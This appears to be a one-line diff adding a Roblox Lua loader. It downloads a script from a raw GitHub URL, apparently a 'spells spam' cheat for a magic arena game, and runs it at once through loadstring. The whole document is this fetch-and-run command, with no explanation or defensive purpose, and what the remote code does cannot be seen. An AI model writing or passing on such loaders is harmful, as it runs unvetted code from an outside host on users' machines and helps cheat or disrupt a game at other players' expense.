@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/draw-spells-magic-arena-spam2-bjkfyo3so6133a.lua"))()
